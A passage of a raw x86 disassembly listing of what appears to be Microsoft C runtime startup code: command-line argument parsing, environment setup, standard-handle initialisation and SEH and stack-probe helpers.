  424bfc:	jne    0x424c05
  424bfe:	mov    esi,0x4295f3
  424c03:	jmp    0x424c4a
  424c05:	mov    al,BYTE PTR [esi]
  424c07:	cmp    al,0x22
  424c09:	jne    0x424c33
  424c0b:	inc    esi
  424c0c:	mov    al,BYTE PTR [esi]
  424c0e:	cmp    al,0x22
  424c10:	je     0x424c43
  424c12:	test   al,al
  424c14:	je     0x424c2c
  424c16:	movzx  eax,al
  424c19:	push   eax
  424c1a:	call   0x425b3b
  424c1f:	test   eax,eax
  424c21:	pop    ecx
  424c22:	je     0x424c25
  424c24:	inc    esi
  424c25:	inc    esi
  424c26:	mov    al,BYTE PTR [esi]
  424c28:	cmp    al,0x22
  424c2a:	jne    0x424c12
  424c2c:	cmp    BYTE PTR [esi],0x22
  424c2f:	jne    0x424c44
  424c31:	jmp    0x424c43
  424c33:	cmp    al,0x20
  424c35:	jbe    0x424c44
  424c37:	inc    esi
  424c38:	cmp    BYTE PTR [esi],0x20
  424c3b:	ja     0x424c37
  424c3d:	jmp    0x424c44
  424c3f:	cmp    al,0x20
  424c41:	ja     0x424c4a
  424c43:	inc    esi
  424c44:	mov    al,BYTE PTR [esi]
  424c46:	test   al,al
  424c48:	jne    0x424c3f
  424c4a:	mov    eax,esi
  424c4c:	pop    esi
  424c4d:	ret    
  424c4e:	push   ebx
  424c4f:	xor    ebx,ebx
  424c51:	cmp    DWORD PTR ds:0x463d6c,ebx
  424c57:	push   esi
  424c58:	push   edi
  424c59:	jne    0x424c60
  424c5b:	call   0x42601c
  424c60:	mov    esi,DWORD PTR ds:0x4635b4
  424c66:	xor    edi,edi
  424c68:	cmp    esi,ebx
  424c6a:	jne    0x424c7e
  424c6c:	jmp    0x424c9e
  424c6e:	cmp    al,0x3d
  424c70:	je     0x424c73
  424c72:	inc    edi
  424c73:	push   esi
  424c74:	call   0x425a40
  424c79:	pop    ecx
  424c7a:	lea    esi,[esi+eax*1+0x1]
  424c7e:	mov    al,BYTE PTR [esi]
  424c80:	cmp    al,bl
  424c82:	jne    0x424c6e
  424c84:	lea    eax,[edi*4+0x4]
  424c8b:	push   eax
  424c8c:	call   0x426152
  424c91:	mov    edi,eax
  424c93:	cmp    edi,ebx
  424c95:	pop    ecx
  424c96:	mov    DWORD PTR ds:0x4635e4,edi
  424c9c:	jne    0x424ca3
  424c9e:	or     eax,0xffffffff
  424ca1:	jmp    0x424cfb
  424ca3:	mov    esi,DWORD PTR ds:0x4635b4
  424ca9:	push   ebp
  424caa:	jmp    0x424cd6
  424cac:	push   esi
  424cad:	call   0x425a40
  424cb2:	mov    ebp,eax
  424cb4:	inc    ebp
  424cb5:	cmp    BYTE PTR [esi],0x3d
  424cb8:	pop    ecx
  424cb9:	je     0x424cd4
  424cbb:	push   ebp
  424cbc:	call   0x426152
  424cc1:	cmp    eax,ebx
  424cc3:	pop    ecx
  424cc4:	mov    DWORD PTR [edi],eax
  424cc6:	je     0x424cff
  424cc8:	push   esi
  424cc9:	push   eax
  424cca:	call   0x425810
  424ccf:	pop    ecx
  424cd0:	pop    ecx
  424cd1:	add    edi,0x4
  424cd4:	add    esi,ebp
  424cd6:	cmp    BYTE PTR [esi],bl
  424cd8:	jne    0x424cac
  424cda:	push   DWORD PTR ds:0x4635b4
  424ce0:	call   0x42603a
  424ce5:	mov    DWORD PTR ds:0x4635b4,ebx
  424ceb:	mov    DWORD PTR [edi],ebx
  424ced:	mov    DWORD PTR ds:0x463d60,0x1
  424cf7:	xor    eax,eax
  424cf9:	pop    ecx
  424cfa:	pop    ebp
  424cfb:	pop    edi
  424cfc:	pop    esi
  424cfd:	pop    ebx
  424cfe:	ret    
  424cff:	push   DWORD PTR ds:0x4635e4
  424d05:	call   0x42603a
  424d0a:	mov    DWORD PTR ds:0x4635e4,ebx
  424d10:	or     eax,0xffffffff
  424d13:	jmp    0x424cf9
  424d15:	push   ebp
  424d16:	mov    ebp,esp
  424d18:	push   ecx
  424d19:	push   ebx
  424d1a:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1d:	xor    edx,edx
  424d1f:	cmp    DWORD PTR [ebp+0x8],edx
  424d22:	push   edi
  424d23:	mov    DWORD PTR [esi],edx
  424d25:	mov    edi,ecx
  424d27:	mov    DWORD PTR [ebx],0x1
  424d2d:	je     0x424d38
  424d2f:	mov    ecx,DWORD PTR [ebp+0x8]
  424d32:	add    DWORD PTR [ebp+0x8],0x4
  424d36:	mov    DWORD PTR [ecx],edi
  424d38:	cmp    BYTE PTR [eax],0x22
  424d3b:	jne    0x424d4b
  424d3d:	xor    ecx,ecx
  424d3f:	test   edx,edx
  424d41:	sete   cl
  424d44:	inc    eax
  424d45:	mov    edx,ecx
  424d47:	mov    cl,0x22
  424d49:	jmp    0x424d78
  424d4b:	inc    DWORD PTR [esi]
  424d4d:	test   edi,edi
  424d4f:	je     0x424d56
  424d51:	mov    cl,BYTE PTR [eax]
  424d53:	mov    BYTE PTR [edi],cl
  424d55:	inc    edi
  424d56:	mov    cl,BYTE PTR [eax]
  424d58:	movzx  ebx,cl
  424d5b:	inc    eax
  424d5c:	test   BYTE PTR [ebx+0x463a21],0x4
  424d63:	je     0x424d71
  424d65:	inc    DWORD PTR [esi]
  424d67:	test   edi,edi
  424d69:	je     0x424d70
  424d6b:	mov    bl,BYTE PTR [eax]
  424d6d:	mov    BYTE PTR [edi],bl
  424d6f:	inc    edi
  424d70:	inc    eax
  424d71:	test   cl,cl
  424d73:	mov    ebx,DWORD PTR [ebp+0xc]
  424d76:	je     0x424daa
  424d78:	test   edx,edx
  424d7a:	jne    0x424d38
  424d7c:	cmp    cl,0x20
  424d7f:	je     0x424d86
  424d81:	cmp    cl,0x9
  424d84:	jne    0x424d38
  424d86:	test   edi,edi
  424d88:	je     0x424d8e
  424d8a:	and    BYTE PTR [edi-0x1],0x0
  424d8e:	and    DWORD PTR [ebp-0x4],0x0
  424d92:	cmp    BYTE PTR [eax],0x0
  424d95:	je     0x424e71
  424d9b:	mov    cl,BYTE PTR [eax]
  424d9d:	cmp    cl,0x20
  424da0:	je     0x424da7
  424da2:	cmp    cl,0x9
  424da5:	jne    0x424dad
  424da7:	inc    eax
  424da8:	jmp    0x424d9b
  424daa:	dec    eax
  424dab:	jmp    0x424d8e
  424dad:	cmp    BYTE PTR [eax],0x0
  424db0:	je     0x424e71
  424db6:	cmp    DWORD PTR [ebp+0x8],0x0
  424dba:	je     0x424dc5
  424dbc:	mov    ecx,DWORD PTR [ebp+0x8]
  424dbf:	add    DWORD PTR [ebp+0x8],0x4
  424dc3:	mov    DWORD PTR [ecx],edi
  424dc5:	inc    DWORD PTR [ebx]
  424dc7:	xor    ebx,ebx
  424dc9:	inc    ebx
  424dca:	xor    edx,edx
  424dcc:	jmp    0x424dd0
  424dce:	inc    eax
  424dcf:	inc    edx
  424dd0:	cmp    BYTE PTR [eax],0x5c
  424dd3:	je     0x424dce
  424dd5:	cmp    BYTE PTR [eax],0x22
  424dd8:	jne    0x424e00
  424dda:	test   dl,0x1
  424ddd:	jne    0x424dfe
  424ddf:	cmp    DWORD PTR [ebp-0x4],0x0
  424de3:	je     0x424df1
  424de5:	lea    ecx,[eax+0x1]
  424de8:	cmp    BYTE PTR [ecx],0x22
  424deb:	jne    0x424df1
  424ded:	mov    eax,ecx
  424def:	jmp    0x424df3
  424df1:	xor    ebx,ebx
  424df3:	xor    ecx,ecx
  424df5:	cmp    DWORD PTR [ebp-0x4],ecx
  424df8:	sete   cl
  424dfb:	mov    DWORD PTR [ebp-0x4],ecx
  424dfe:	shr    edx,1
  424e00:	test   edx,edx
  424e02:	je     0x424e11
  424e04:	test   edi,edi
  424e06:	je     0x424e0c
  424e08:	mov    BYTE PTR [edi],0x5c
  424e0b:	inc    edi
  424e0c:	inc    DWORD PTR [esi]
  424e0e:	dec    edx
  424e0f:	jne    0x424e04
  424e11:	mov    cl,BYTE PTR [eax]
  424e13:	test   cl,cl
  424e15:	je     0x424e5f
  424e17:	cmp    DWORD PTR [ebp-0x4],0x0
  424e1b:	jne    0x424e27
  424e1d:	cmp    cl,0x20
  424e20:	je     0x424e5f
  424e22:	cmp    cl,0x9
  424e25:	je     0x424e5f
  424e27:	test   ebx,ebx
  424e29:	je     0x424e59
  424e2b:	test   edi,edi
  424e2d:	je     0x424e48
  424e2f:	movzx  edx,cl
  424e32:	test   BYTE PTR [edx+0x463a21],0x4
  424e39:	je     0x424e41
  424e3b:	mov    BYTE PTR [edi],cl
  424e3d:	inc    edi
  424e3e:	inc    eax
  424e3f:	inc    DWORD PTR [esi]
  424e41:	mov    cl,BYTE PTR [eax]
  424e43:	mov    BYTE PTR [edi],cl
  424e45:	inc    edi
  424e46:	jmp    0x424e57
  424e48:	movzx  ecx,cl
  424e4b:	test   BYTE PTR [ecx+0x463a21],0x4
  424e52:	je     0x424e57
  424e54:	inc    eax
  424e55:	inc    DWORD PTR [esi]
  424e57:	inc    DWORD PTR [esi]
  424e59:	inc    eax
  424e5a:	jmp    0x424dc7
  424e5f:	test   edi,edi
  424e61:	je     0x424e67
  424e63:	and    BYTE PTR [edi],0x0
  424e66:	inc    edi
  424e67:	inc    DWORD PTR [esi]
  424e69:	mov    ebx,DWORD PTR [ebp+0xc]
  424e6c:	jmp    0x424d92
  424e71:	mov    eax,DWORD PTR [ebp+0x8]
  424e74:	test   eax,eax
  424e76:	je     0x424e7b
  424e78:	and    DWORD PTR [eax],0x0
  424e7b:	inc    DWORD PTR [ebx]
  424e7d:	pop    edi
  424e7e:	pop    ebx
  424e7f:	leave  
  424e80:	ret    
  424e81:	push   ebp
  424e82:	mov    ebp,esp
  424e84:	push   ecx
  424e85:	push   ecx
  424e86:	push   ebx
  424e87:	push   esi
  424e88:	push   edi
  424e89:	xor    edi,edi
  424e8b:	cmp    DWORD PTR ds:0x463d6c,edi
  424e91:	jne    0x424e98
  424e93:	call   0x42601c
  424e98:	and    BYTE PTR ds:0x463714,0x0
  424e9f:	push   0x104
  424ea4:	mov    esi,0x463610
  424ea9:	push   esi
  424eaa:	push   edi
  424eab:	call   DWORD PTR ds:0x4290a8
  424eb1:	mov    eax,ds:0x463d74
  424eb6:	cmp    eax,edi
  424eb8:	mov    DWORD PTR ds:0x4635f4,esi
  424ebe:	je     0x424ec7
  424ec0:	cmp    BYTE PTR [eax],0x0
  424ec3:	mov    ebx,eax
  424ec5:	jne    0x424ec9
  424ec7:	mov    ebx,esi
  424ec9:	lea    eax,[ebp-0x4]
  424ecc:	push   eax
  424ecd:	push   edi
  424ece:	lea    esi,[ebp-0x8]
  424ed1:	xor    ecx,ecx
  424ed3:	mov    eax,ebx
  424ed5:	call   0x424d15
  424eda:	mov    esi,DWORD PTR [ebp-0x4]
  424edd:	mov    eax,DWORD PTR [ebp-0x8]
  424ee0:	shl    esi,0x2
  424ee3:	add    eax,esi
  424ee5:	push   eax
  424ee6:	call   0x426152
  424eeb:	mov    edi,eax
  424eed:	add    esp,0xc
  424ef0:	test   edi,edi
  424ef2:	jne    0x424ef9
  424ef4:	or     eax,0xffffffff
  424ef7:	jmp    0x424f1e
  424ef9:	lea    eax,[ebp-0x4]
  424efc:	push   eax
  424efd:	lea    ecx,[esi+edi*1]
  424f00:	push   edi
  424f01:	lea    esi,[ebp-0x8]
  424f04:	mov    eax,ebx
  424f06:	call   0x424d15
  424f0b:	mov    eax,DWORD PTR [ebp-0x4]
  424f0e:	dec    eax
  424f0f:	pop    ecx
  424f10:	mov    ds:0x4635d8,eax
  424f15:	pop    ecx
  424f16:	mov    DWORD PTR ds:0x4635dc,edi
  424f1c:	xor    eax,eax
  424f1e:	pop    edi
  424f1f:	pop    esi
  424f20:	pop    ebx
  424f21:	leave  
  424f22:	ret    
  424f23:	push   ecx
  424f24:	push   ecx
  424f25:	mov    eax,ds:0x463718
  424f2a:	push   ebx
  424f2b:	push   ebp
  424f2c:	push   esi
  424f2d:	push   edi
  424f2e:	mov    edi,DWORD PTR ds:0x4290c0
  424f34:	xor    ebx,ebx
  424f36:	xor    esi,esi
  424f38:	cmp    eax,ebx
  424f3a:	push   0x2
  424f3c:	pop    ebp
  424f3d:	jne    0x424f6c
  424f3f:	call   edi
  424f41:	mov    esi,eax
  424f43:	cmp    esi,ebx
  424f45:	je     0x424f53
  424f47:	mov    DWORD PTR ds:0x463718,0x1
  424f51:	jmp    0x424f71
  424f53:	call   DWORD PTR ds:0x429030
  424f59:	cmp    eax,0x78
  424f5c:	jne    0x424f67
  424f5e:	mov    eax,ebp
  424f60:	mov    ds:0x463718,eax
  424f65:	jmp    0x424f6c
  424f67:	mov    eax,ds:0x463718
  424f6c:	cmp    eax,0x1
  424f6f:	jne    0x424fee
  424f71:	cmp    esi,ebx
  424f73:	jne    0x424f7d
  424f75:	call   edi
  424f77:	mov    esi,eax
  424f79:	cmp    esi,ebx
  424f7b:	je     0x424ff6
  424f7d:	cmp    WORD PTR [esi],bx
  424f80:	mov    eax,esi
  424f82:	je     0x424f92
  424f84:	add    eax,ebp
  424f86:	cmp    WORD PTR [eax],bx
  424f89:	jne    0x424f84
  424f8b:	add    eax,ebp
  424f8d:	cmp    WORD PTR [eax],bx
  424f90:	jne    0x424f84
  424f92:	mov    edi,DWORD PTR ds:0x4290bc
  424f98:	push   ebx
  424f99:	push   ebx
  424f9a:	push   ebx
  424f9b:	sub    eax,esi
  424f9d:	push   ebx
  424f9e:	sar    eax,1
  424fa0:	inc    eax
  424fa1:	push   eax
  424fa2:	push   esi
  424fa3:	push   ebx
  424fa4:	push   ebx
  424fa5:	mov    DWORD PTR [esp+0x34],eax
  424fa9:	call   edi
  424fab:	mov    ebp,eax
  424fad:	cmp    ebp,ebx
  424faf:	je     0x424fe3
  424fb1:	push   ebp
  424fb2:	call   0x426152
  424fb7:	cmp    eax,ebx
  424fb9:	pop    ecx
  424fba:	mov    DWORD PTR [esp+0x10],eax
  424fbe:	je     0x424fe3
  424fc0:	push   ebx
  424fc1:	push   ebx
  424fc2:	push   ebp
  424fc3:	push   eax
  424fc4:	push   DWORD PTR [esp+0x24]
  424fc8:	push   esi
  424fc9:	push   ebx
  424fca:	push   ebx
  424fcb:	call   edi
  424fcd:	test   eax,eax
  424fcf:	jne    0x424fdf
  424fd1:	push   DWORD PTR [esp+0x10]
  424fd5:	call   0x42603a
  424fda:	pop    ecx
  424fdb:	mov    DWORD PTR [esp+0x10],ebx
  424fdf:	mov    ebx,DWORD PTR [esp+0x10]
  424fe3:	push   esi
  424fe4:	call   DWORD PTR ds:0x4290b8
  424fea:	mov    eax,ebx
  424fec:	jmp    0x42503e
  424fee:	cmp    eax,ebp
  424ff0:	je     0x424ffa
  424ff2:	cmp    eax,ebx
  424ff4:	je     0x424ffa
  424ff6:	xor    eax,eax
  424ff8:	jmp    0x42503e
  424ffa:	call   DWORD PTR ds:0x4290b4
  425000:	mov    esi,eax
  425002:	cmp    esi,ebx
  425004:	je     0x424ff6
  425006:	cmp    BYTE PTR [esi],bl
  425008:	je     0x425014
  42500a:	inc    eax
  42500b:	cmp    BYTE PTR [eax],bl
  42500d:	jne    0x42500a
  42500f:	inc    eax
  425010:	cmp    BYTE PTR [eax],bl
  425012:	jne    0x42500a
  425014:	sub    eax,esi
  425016:	inc    eax
  425017:	mov    ebp,eax
  425019:	push   ebp
  42501a:	call   0x426152
  42501f:	mov    edi,eax
  425021:	cmp    edi,ebx
  425023:	pop    ecx
  425024:	jne    0x42502a
  425026:	xor    edi,edi
  425028:	jmp    0x425035
  42502a:	push   ebp
  42502b:	push   esi
  42502c:	push   edi
  42502d:	call   0x426170
  425032:	add    esp,0xc
  425035:	push   esi
  425036:	call   DWORD PTR ds:0x4290b0
  42503c:	mov    eax,edi
  42503e:	pop    edi
  42503f:	pop    esi
  425040:	pop    ebp
  425041:	pop    ebx
  425042:	pop    ecx
  425043:	pop    ecx
  425044:	ret    
  425045:	sub    esp,0x48
  425048:	push   ebx
  425049:	mov    ebx,0x480
  42504e:	push   ebx
  42504f:	call   0x426152
  425054:	test   eax,eax
  425056:	pop    ecx
  425057:	jne    0x425061
  425059:	or     eax,0xffffffff
  42505c:	jmp    0x42523e
  425061:	mov    ds:0x463c60,eax
  425066:	mov    DWORD PTR ds:0x463c48,0x20
  425070:	lea    ecx,[eax+0x480]
  425076:	jmp    0x425096
  425078:	and    BYTE PTR [eax+0x4],0x0
  42507c:	or     DWORD PTR [eax],0xffffffff
  42507f:	and    DWORD PTR [eax+0x8],0x0
  425083:	mov    BYTE PTR [eax+0x5],0xa
  425087:	mov    ecx,DWORD PTR ds:0x463c60
  42508d:	add    eax,0x24
  425090:	add    ecx,0x480
  425096:	cmp    eax,ecx
  425098:	jb     0x425078
  42509a:	push   ebp
  42509b:	push   esi
  42509c:	push   edi
  42509d:	lea    eax,[esp+0x14]
  4250a1:	push   eax
  4250a2:	call   DWORD PTR ds:0x429090
  4250a8:	cmp    WORD PTR [esp+0x46],0x0
  4250ae:	je     0x42519d
  4250b4:	mov    eax,DWORD PTR [esp+0x48]
  4250b8:	test   eax,eax
  4250ba:	je     0x42519d
  4250c0:	mov    edi,DWORD PTR [eax]
  4250c2:	lea    ebp,[eax+0x4]
  4250c5:	lea    eax,[edi+ebp*1]
  4250c8:	mov    DWORD PTR [esp+0x10],eax
  4250cc:	mov    eax,0x800
  4250d1:	cmp    edi,eax
  4250d3:	jl     0x4250d7
  4250d5:	mov    edi,eax
  4250d7:	cmp    DWORD PTR ds:0x463c48,edi
  4250dd:	jge    0x42512d
  4250df:	mov    esi,0x463c64
  4250e4:	push   ebx
  4250e5:	call   0x426152
  4250ea:	test   eax,eax
  4250ec:	pop    ecx
  4250ed:	je     0x425127
  4250ef:	add    DWORD PTR ds:0x463c48,0x20
  4250f6:	mov    DWORD PTR [esi],eax
  4250f8:	lea    ecx,[eax+0x480]
  4250fe:	jmp    0x425116
  425100:	and    BYTE PTR [eax+0x4],0x0
  425104:	or     DWORD PTR [eax],0xffffffff
  425107:	and    DWORD PTR [eax+0x8],0x0
  42510b:	mov    BYTE PTR [eax+0x5],0xa
  42510f:	mov    ecx,DWORD PTR [esi]
  425111:	add    eax,0x24
  425114:	add    ecx,ebx
  425116:	cmp    eax,ecx
  425118:	jb     0x425100
  42511a:	add    esi,0x4
  42511d:	cmp    DWORD PTR ds:0x463c48,edi
  425123:	jl     0x4250e4
  425125:	jmp    0x42512d
  425127:	mov    edi,DWORD PTR ds:0x463c48
  42512d:	xor    ebx,ebx
  42512f:	test   edi,edi
  425131:	jle    0x42519d
  425133:	mov    eax,DWORD PTR [esp+0x10]
  425137:	mov    eax,DWORD PTR [eax]
  425139:	cmp    eax,0xffffffff
  42513c:	je     0x425192
  42513e:	mov    cl,BYTE PTR [ebp+0x0]
  425141:	test   cl,0x1
  425144:	je     0x425192
  425146:	test   cl,0x8
  425149:	jne    0x425156
  42514b:	push   eax
  42514c:	call   DWORD PTR ds:0x4290c8
  425152:	test   eax,eax
  425154:	je     0x425192
  425156:	mov    ecx,ebx
  425158:	mov    eax,ebx
  42515a:	and    eax,0x1f
  42515d:	lea    eax,[eax+eax*8]
  425160:	sar    ecx,0x5
  425163:	mov    ecx,DWORD PTR [ecx*4+0x463c60]
  42516a:	lea    esi,[ecx+eax*4]
  42516d:	mov    eax,DWORD PTR [esp+0x10]
  425171:	mov    eax,DWORD PTR [eax]
  425173:	mov    DWORD PTR [esi],eax
  425175:	mov    al,BYTE PTR [ebp+0x0]
  425178:	mov    BYTE PTR [esi+0x4],al
  42517b:	lea    eax,[esi+0xc]
  42517e:	push   0xfa0
  425183:	push   eax
  425184:	call   0x4264bd
  425189:	test   eax,eax
  42518b:	pop    ecx
  42518c:	pop    ecx
  42518d:	je     0x4251bd
  42518f:	inc    DWORD PTR [esi+0x8]
  425192:	add    DWORD PTR [esp+0x10],0x4
  425197:	inc    ebx
  425198:	inc    ebp
  425199:	cmp    ebx,edi
  42519b:	jl     0x425133
  42519d:	xor    ebx,ebx
  42519f:	mov    ecx,DWORD PTR ds:0x463c60
  4251a5:	lea    eax,[ebx+ebx*8]
  4251a8:	lea    esi,[ecx+eax*4]
  4251ab:	cmp    DWORD PTR [esi],0xffffffff
  4251ae:	jne    0x42521f
  4251b0:	test   ebx,ebx
  4251b2:	mov    BYTE PTR [esi+0x4],0x81
  4251b6:	jne    0x4251c2
  4251b8:	push   0xfffffff6
  4251ba:	pop    eax
  4251bb:	jmp    0x4251cc
  4251bd:	or     eax,0xffffffff
  4251c0:	jmp    0x42523b
  4251c2:	mov    eax,ebx
  4251c4:	dec    eax
  4251c5:	neg    eax
  4251c7:	sbb    eax,eax
  4251c9:	add    eax,0xfffffff5
  4251cc:	push   eax
  4251cd:	call   DWORD PTR ds:0x4290a4
  4251d3:	mov    edi,eax
  4251d5:	cmp    edi,0xffffffff
  4251d8:	je     0x425219
  4251da:	push   edi
  4251db:	call   DWORD PTR ds:0x4290c8
  4251e1:	test   eax,eax
  4251e3:	je     0x425219
  4251e5:	and    eax,0xff
  4251ea:	cmp    eax,0x2
  4251ed:	mov    DWORD PTR [esi],edi
  4251ef:	jne    0x4251f7
  4251f1:	or     BYTE PTR [esi+0x4],0x40
  4251f5:	jmp    0x425200
  4251f7:	cmp    eax,0x3
  4251fa:	jne    0x425200
  4251fc:	or     BYTE PTR [esi+0x4],0x8
  425200:	lea    eax,[esi+0xc]
  425203:	push   0xfa0
  425208:	push   eax
  425209:	call   0x4264bd
  42520e:	test   eax,eax
  425210:	pop    ecx
  425211:	pop    ecx
  425212:	je     0x4251bd
  425214:	inc    DWORD PTR [esi+0x8]
  425217:	jmp    0x425223
  425219:	or     BYTE PTR [esi+0x4],0x40
  42521d:	jmp    0x425223
  42521f:	or     BYTE PTR [esi+0x4],0x80
  425223:	inc    ebx
  425224:	cmp    ebx,0x3
  425227:	jl     0x42519f
  42522d:	push   DWORD PTR ds:0x463c48
  425233:	call   DWORD PTR ds:0x4290c4
  425239:	xor    eax,eax
  42523b:	pop    edi
  42523c:	pop    esi
  42523d:	pop    ebp
  42523e:	pop    ebx
  42523f:	add    esp,0x48
  425242:	ret    
  425243:	push   0xc
  425245:	push   0x4295f8
  42524a:	call   0x425434
  42524f:	mov    DWORD PTR [ebp-0x1c],0x42a050
  425256:	cmp    DWORD PTR [ebp-0x1c],0x42a050
  42525d:	jae    0x425281
  42525f:	and    DWORD PTR [ebp-0x4],0x0
  425263:	mov    eax,DWORD PTR [ebp-0x1c]
  425266:	mov    eax,DWORD PTR [eax]
  425268:	test   eax,eax
  42526a:	je     0x425277
  42526c:	call   eax
  42526e:	jmp    0x425277
  425270:	xor    eax,eax
  425272:	inc    eax
  425273:	ret    
  425274:	mov    esp,DWORD PTR [ebp-0x18]
  425277:	or     DWORD PTR [ebp-0x4],0xffffffff
  42527b:	add    DWORD PTR [ebp-0x1c],0x4
  42527f:	jmp    0x425256
  425281:	call   0x42546f
  425286:	ret    
  425287:	push   0xc
  425289:	push   0x429608
  42528e:	call   0x425434
  425293:	mov    DWORD PTR [ebp-0x1c],0x42a058
  42529a:	cmp    DWORD PTR [ebp-0x1c],0x42a058
  4252a1:	jae    0x4252c5
  4252a3:	and    DWORD PTR [ebp-0x4],0x0
  4252a7:	mov    eax,DWORD PTR [ebp-0x1c]
  4252aa:	mov    eax,DWORD PTR [eax]
  4252ac:	test   eax,eax
  4252ae:	je     0x4252bb
  4252b0:	call   eax
  4252b2:	jmp    0x4252bb
  4252b4:	xor    eax,eax
  4252b6:	inc    eax
  4252b7:	ret    
  4252b8:	mov    esp,DWORD PTR [ebp-0x18]
  4252bb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4252bf:	add    DWORD PTR [ebp-0x1c],0x4
  4252c3:	jmp    0x42529a
  4252c5:	call   0x42546f
  4252ca:	ret    
  4252cb:	call   0x425506
  4252d0:	mov    eax,ds:0x462dfc
  4252d5:	cmp    eax,0xffffffff
  4252d8:	je     0x4252e8
  4252da:	push   eax
  4252db:	call   DWORD PTR ds:0x4290d0
  4252e1:	or     DWORD PTR ds:0x462dfc,0xffffffff
  4252e8:	ret    
  4252e9:	push   ebx
  4252ea:	push   esi
  4252eb:	call   DWORD PTR ds:0x429030
  4252f1:	push   DWORD PTR ds:0x462dfc
  4252f7:	mov    ebx,eax
  4252f9:	call   DWORD PTR ds:0x4290e0
  4252ff:	mov    esi,eax
  425301:	test   esi,esi
  425303:	jne    0x42534e
  425305:	push   0x88
  42530a:	push   0x1
  42530c:	call   0x426548
  425311:	mov    esi,eax
  425313:	test   esi,esi
  425315:	pop    ecx
  425316:	pop    ecx
  425317:	je     0x425346
  425319:	push   esi
  42531a:	push   DWORD PTR ds:0x462dfc
  425320:	call   DWORD PTR ds:0x4290dc
  425326:	test   eax,eax
  425328:	je     0x425346
  42532a:	mov    DWORD PTR [esi+0x54],0x462d50
  425331:	mov    DWORD PTR [esi+0x14],0x1
  425338:	call   DWORD PTR ds:0x4290d8
  42533e:	or     DWORD PTR [esi+0x4],0xffffffff
  425342:	mov    DWORD PTR [esi],eax
  425344:	jmp    0x42534e
  425346:	push   0x10
  425348:	call   0x4244fc
  42534d:	pop    ecx
  42534e:	push   ebx
  42534f:	call   DWORD PTR ds:0x4290d4
  425355:	mov    eax,esi
  425357:	pop    esi
  425358:	pop    ebx
  425359:	ret    
  42535a:	call   0x4254bd
  42535f:	test   eax,eax
  425361:	je     0x425373
  425363:	call   DWORD PTR ds:0x4290e4
  425369:	cmp    eax,0xffffffff
  42536c:	mov    ds:0x462dfc,eax
  425371:	jne    0x42537b
  425373:	call   0x4252cb
  425378:	xor    eax,eax
  42537a:	ret    
  42537b:	push   esi
  42537c:	push   0x88
  425381:	push   0x1
  425383:	call   0x426548
  425388:	mov    esi,eax
  42538a:	test   esi,esi
  42538c:	pop    ecx
  42538d:	pop    ecx
  42538e:	je     0x4253c0
  425390:	push   esi
  425391:	push   DWORD PTR ds:0x462dfc
  425397:	call   DWORD PTR ds:0x4290dc
  42539d:	test   eax,eax
  42539f:	je     0x4253c0
  4253a1:	mov    DWORD PTR [esi+0x54],0x462d50
  4253a8:	mov    DWORD PTR [esi+0x14],0x1
  4253af:	call   DWORD PTR ds:0x4290d8
  4253b5:	or     DWORD PTR [esi+0x4],0xffffffff
  4253b9:	mov    DWORD PTR [esi],eax
  4253bb:	xor    eax,eax
  4253bd:	inc    eax
  4253be:	pop    esi
  4253bf:	ret    
  4253c0:	call   0x4252cb
  4253c5:	xor    eax,eax
  4253c7:	pop    esi
  4253c8:	ret    
  4253c9:	cmp    DWORD PTR ds:0x4635c4,0x2
  4253d0:	jne    0x4253df
  4253d2:	cmp    DWORD PTR ds:0x4635d0,0x5
  4253d9:	jb     0x4253df
  4253db:	xor    eax,eax
  4253dd:	inc    eax
  4253de:	ret    
  4253df:	push   0x3
  4253e1:	pop    eax
  4253e2:	ret    
  4253e3:	xor    eax,eax
  4253e5:	cmp    DWORD PTR [esp+0x4],eax
  4253e9:	push   0x0
  4253eb:	sete   al
  4253ee:	push   0x1000
  4253f3:	push   eax
  4253f4:	call   DWORD PTR ds:0x429040
  4253fa:	test   eax,eax
  4253fc:	mov    ds:0x463c40,eax
  425401:	je     0x42542d
  425403:	call   0x4253c9
  425408:	cmp    eax,0x3
  42540b:	mov    ds:0x463c44,eax
  425410:	jne    0x425430
  425412:	push   0x3f8
  425417:	call   0x4267ca
  42541c:	test   eax,eax
  42541e:	pop    ecx
  42541f:	jne    0x425430
  425421:	push   DWORD PTR ds:0x463c40
  425427:	call   DWORD PTR ds:0x4290e8
  42542d:	xor    eax,eax
  42542f:	ret    
  425430:	xor    eax,eax
  425432:	inc    eax
  425433:	ret    
  425434:	push   0x4272f8
  425439:	mov    eax,fs:0x0
  42543f:	push   eax
  425440:	mov    eax,DWORD PTR [esp+0x10]
  425444:	mov    DWORD PTR [esp+0x10],ebp
  425448:	lea    ebp,[esp+0x10]
  42544c:	sub    esp,eax
  42544e:	push   ebx
  42544f:	push   esi
  425450:	push   edi
  425451:	mov    eax,DWORD PTR [ebp-0x8]
  425454:	mov    DWORD PTR [ebp-0x18],esp
  425457:	push   eax
  425458:	mov    eax,DWORD PTR [ebp-0x4]
  42545b:	mov    DWORD PTR [ebp-0x4],0xffffffff
  425462:	mov    DWORD PTR [ebp-0x8],eax
  425465:	lea    eax,[ebp-0x10]
  425468:	mov    fs:0x0,eax
  42546e:	ret    
  42546f:	mov    ecx,DWORD PTR [ebp-0x10]
  425472:	mov    DWORD PTR fs:0x0,ecx
  425479:	pop    ecx
  42547a:	pop    edi
  42547b:	pop    esi
  42547c:	pop    ebx
  42547d:	leave  
  42547e:	push   ecx
  42547f:	ret    
  425480:	cmp    eax,0x1000
  425485:	jae    0x425495
  425487:	neg    eax
  425489:	add    eax,esp
  42548b:	add    eax,0x4
  42548e:	test   DWORD PTR [eax],eax
  425490:	xchg   esp,eax
  425491:	mov    eax,DWORD PTR [eax]
  425493:	push   eax
  425494:	ret    
  425495:	push   ecx
  425496:	lea    ecx,[esp+0x8]
  42549a:	sub    ecx,0x1000
  4254a0:	sub    eax,0x1000
  4254a5:	test   DWORD PTR [ecx],eax
  4254a7:	cmp    eax,0x1000
  4254ac:	jae    0x42549a
  4254ae:	sub    ecx,eax
  4254b0:	mov    eax,esp
  4254b2:	test   DWORD PTR [ecx],eax
  4254b4:	mov    esp,ecx
  4254b6:	mov    ecx,DWORD PTR [eax]
  4254b8:	mov    eax,DWORD PTR [eax+0x4]
  4254bb:	push   eax
  4254bc:	ret    
  4254bd:	push   esi
  4254be:	push   edi
  4254bf:	xor    esi,esi
  4254c1:	mov    edi,0x463720
  4254c6:	cmp    DWORD PTR [esi*8+0x462e14],0x1
  4254ce:	jne    0x4254ee
  4254d0:	lea    eax,[esi*8+0x462e10]
